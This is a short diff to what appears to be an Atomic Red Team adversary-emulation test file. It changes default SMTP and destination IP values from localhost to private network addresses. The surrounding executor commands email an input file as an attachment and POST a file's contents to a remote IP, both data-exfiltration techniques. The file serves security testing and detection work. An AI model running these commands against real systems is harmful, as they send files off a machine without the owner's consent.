@@ -139,7 +139,7 @@ atomic_tests:
     smtp_server:
       description: SMTP Server IP Address
       type: String
-      default: 127.0.0.1
+      default: 192.168.1.100
   executor:
     command: |
       Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments #{input_file} -SmtpServer #{smtp_server}
@@ -159,7 +159,7 @@ atomic_tests:
     ip_address:
       description: Destination IP address
       type: String
-      default: 127.0.0.1
+      default: 192.168.1.4
   executor:
     command: |
       Invoke-WebRequest -Uri #{ip_address} -Method POST -Body #{input_file}
